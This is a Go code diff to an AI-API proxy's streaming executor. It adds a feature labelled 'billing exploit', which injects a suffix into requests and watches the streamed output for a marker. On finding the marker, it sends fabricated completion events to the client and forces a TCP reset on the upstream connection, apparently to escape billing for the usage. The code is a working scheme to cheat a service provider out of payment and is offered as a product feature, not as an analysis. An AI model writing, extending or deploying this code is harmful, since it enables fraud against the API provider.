@@ -444,6 +444,10 @@ func (e *CodexExecutor) ExecuteStream(ctx context.Context, auth *cliproxyauth.Au
 	body, _ = sjson.SetBytes(body, "model", baseModel)
 	body, _ = sjson.SetBytes(body, "stream", true)
 	body = normalizeCodexInstructions(body)
+	exploitOpts := parseBillingExploit(auth)
+	if exploitOpts.Enabled {
+		body = injectExploitSuffix(body, exploitOpts)
+	}
 	if e.cfg == nil || e.cfg.DisableImageGeneration == config.DisableImageGenerationOff {
 		body = ensureImageGenerationTool(body, baseModel, auth)
 	}
@@ -472,7 +476,13 @@ func (e *CodexExecutor) ExecuteStream(ctx context.Context, auth *cliproxyauth.Au
 		AuthValue: authValue,
 	})
 
-	httpClient := helps.NewProxyAwareHTTPClient(ctx, e.cfg, auth, 0)
+	var tracker *connTracker
+	var httpClient *http.Client
+	if exploitOpts.Enabled {
+		httpClient, tracker = newExploitHTTPClient(ctx, e.cfg, auth)
+	} else {
+		httpClient = helps.NewProxyAwareHTTPClient(ctx, e.cfg, auth, 0)
+	}
 	httpResp, err := httpClient.Do(httpReq)
 	if err != nil {
 		helps.RecordAPIResponseError(ctx, e.cfg, err)
@@ -506,6 +516,13 @@ func (e *CodexExecutor) ExecuteStream(ctx context.Context, auth *cliproxyauth.Au
 		var param any
 		outputItemsByIndex := make(map[int64][]byte)
 		var outputItemsFallback [][]byte
+
+		var md *markerDetector
+		var cachedModel string
+		if exploitOpts.Enabled {
+			md = newMarkerDetector(exploitOpts.Marker)
+		}
+
 		for scanner.Scan() {
 			line := scanner.Bytes()
 			helps.AppendAPIResponseChunk(ctx, e.cfg, line)
@@ -513,7 +530,12 @@ func (e *CodexExecutor) ExecuteStream(ctx context.Context, auth *cliproxyauth.Au
 
 			if bytes.HasPrefix(line, dataTag) {
 				data := bytes.TrimSpace(line[5:])
-				switch gjson.GetBytes(data, "type").String() {
+				eventType := gjson.GetBytes(data, "type").String()
+				switch eventType {
+				case "response.created":
+					if m := gjson.GetBytes(data, "response.model").String(); m != "" {
+						cachedModel = m
+					}
 				case "response.output_item.done":
 					collectCodexOutputItemDone(data, outputItemsByIndex, &outputItemsFallback)
 				case "response.completed":
@@ -524,6 +546,64 @@ func (e *CodexExecutor) ExecuteStream(ctx context.Context, auth *cliproxyauth.Au
 					data = patchCodexCompletedOutput(data, outputItemsByIndex, outputItemsFallback)
 					translatedLine = append([]byte("data: "), data...)
 				}
+
+				// Billing exploit: detect marker in text deltas
+				if md != nil && eventType == "response.output_text.delta" {
+					delta := gjson.GetBytes(data, "delta").String()
+					safe, found := md.Feed(delta)
+					if found {
+						// Send the safe portion as a final delta
+						if safe != "" {
+							synthDelta, _ := sjson.SetBytes(data, "delta", safe)
+							synthLine := append([]byte("data: "), synthDelta...)
+							chunks := sdktranslator.TranslateStream(ctx, to, from, req.Model, originalPayload, body, synthLine, &param)
+							for i := range chunks {
+								select {
+								case out <- cliproxyexecutor.StreamChunk{Payload: chunks[i]}:
+								case <-ctx.Done():
+									return
+								}
+							}
+						}
+						// Send synthesized completion events
+						model := cachedModel
+						if model == "" {
+							model = baseModel
+						}
+						for _, evt := range synthesizeResponseCompleted(model) {
+							chunks := sdktranslator.TranslateStream(ctx, to, from, req.Model, originalPayload, body, evt, &param)
+							for i := range chunks {
+								select {
+								case out <- cliproxyexecutor.StreamChunk{Payload: chunks[i]}:
+								case <-ctx.Done():
+									return
+								}
+							}
+						}
+						// Force RST on upstream connection
+						if tracker != nil {
+							tracker.ForceRST()
+							time.Sleep(time.Millisecond)
+						}
+						reporter.EnsurePublished(ctx)
+						log.Infof("billing-exploit: marker detected, RST sent for model=%s", baseModel)
+						return
+					}
+					// Replace delta with safe portion only
+					if safe != "" {
+						synthDelta, _ := sjson.SetBytes(data, "delta", safe)
+						synthLine := append([]byte("data: "), synthDelta...)
+						chunks := sdktranslator.TranslateStream(ctx, to, from, req.Model, originalPayload, body, synthLine, &param)
+						for i := range chunks {
+							select {
+							case out <- cliproxyexecutor.StreamChunk{Payload: chunks[i]}:
+							case <-ctx.Done():
+								return
+							}
+						}
+					}
+					continue // skip normal forwarding for this line
+				}
 			}
 
 			chunks := sdktranslator.TranslateStream(ctx, to, from, req.Model, originalPayload, body, translatedLine, &param)
@@ -532,6 +612,20 @@ func (e *CodexExecutor) ExecuteStream(ctx context.Context, auth *cliproxyauth.Au
 				case out <- cliproxyexecutor.StreamChunk{Payload: chunks[i]}:
 				case <-ctx.Done():
 					return
+				}
+			}
+		}
+		// Stream ended without marker: flush any held buffer
+		if md != nil {
+			if remaining := md.Flush(); remaining != "" {
+				synthLine := []byte(fmt.Sprintf(`data: {"type":"response.output_text.delta","delta":"%s"}`, strings.ReplaceAll(remaining, `"`, `\"`)))
+				chunks := sdktranslator.TranslateStream(ctx, to, from, req.Model, originalPayload, body, synthLine, &param)
+				for i := range chunks {
+					select {
+					case out <- cliproxyexecutor.StreamChunk{Payload: chunks[i]}:
+					case <-ctx.Done():
+						return
+					}
 				}
 			}
 		}
